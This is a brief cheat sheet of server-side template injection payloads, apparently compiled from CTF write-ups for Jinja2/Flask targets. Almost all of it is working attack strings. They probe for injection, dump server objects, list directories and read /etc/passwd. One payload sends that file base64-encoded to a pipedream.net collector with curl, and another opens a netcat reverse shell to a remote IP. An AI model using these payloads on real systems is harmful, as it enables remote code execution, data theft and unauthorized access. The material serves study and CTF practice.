# SSTI (Server Side Template Injection)

> Tool

    tplmap

## Test

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

    47  -> system is vulnerable

## Get server info

    {{g}}
    {{self}}
    {{request}}
    {{config}}

## function that can be called for RCE

    {{url_for}}
    {{[].__class__.__base__.__subclasses__()}}

### url_for

> List directory

    {{url_for.__globals__.os.__dict__.listdir('/home')}}

> Read file

    {{url_for.__globals__.__builtins__.open('/etc/passwd').read()}} 

### [].__class__.__base__.__subclasses__()   -> to retest

Looking for useful fonctions:

    {{ [].__class__.__base__.__subclasses__() }}

Output exemple

    [725] subprocess.Popen

Send data:

```bash
{{ [].__class__.__base__.__subclasses__().pop(725)("curl https://xxx.m.pipedream.net -d \"test=$(cat /etc/passwd |base64)\"", shell=True)}}
```

Getting RCE:

```bash
{{ [].__class__.__base__.__subclasses__().pop(725)("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 1337 >/tmp/f", shell=True)}}
```

## Sources

- <https://ctftime.org/writeup/11014>
- <https://medium.com/bugbountywriteup/tokyowesterns-ctf-4th-2018-writeup-part-3-1c8510dfad3f>
